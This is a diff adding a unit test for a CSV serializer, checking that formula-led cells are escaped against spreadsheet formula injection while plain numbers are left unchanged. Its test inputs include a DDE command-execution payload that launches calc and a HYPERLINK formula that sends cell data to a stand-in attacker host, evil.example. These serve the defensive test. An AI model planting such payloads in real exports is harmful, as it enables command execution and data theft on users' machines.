@@ -44,6 +44,25 @@ describe('extract saving', () => {
     expect(csv).toBe('name,note,n\r\n"Mug, large","say ""hi""\nnow",3\r\n"\'=HYPERLINK(""x"")",,-2\r\n')
   })
 
+  it('quotes formula-led cells unless the whole cell is a plain number (csv-poc)', () => {
+    const csv = serializeRows({ columns: ['a'], rows: [
+      { a: '=1+1' }, { a: "-1+cmd|' /C calc'!A0" }, { a: '-2+HYPERLINK("http://evil.example/?"&A1,"x")' },
+      { a: '-5' }, { a: '-5.25' }, { a: '+1' }, { a: '@SUM(A1)' }, { a: '\tx' }, { a: -7 }, { a: '-' },
+    ] }, 'csv')
+    expect(csv.split('\r\n').slice(1, -1)).toEqual([
+      "'=1+1",
+      "'-1+cmd|' /C calc'!A0",
+      '"\'-2+HYPERLINK(""http://evil.example/?""&A1,""x"")"',
+      '-5',
+      '-5.25',
+      "'+1",
+      "'@SUM(A1)",
+      "'\tx",
+      '-7',
+      "'-",
+    ])
+  })
+
   const target = (root: string): WorkspaceWriteTarget => ({ mode: 'workspace-write', root })
 
   for (const portable of [false, true]) {
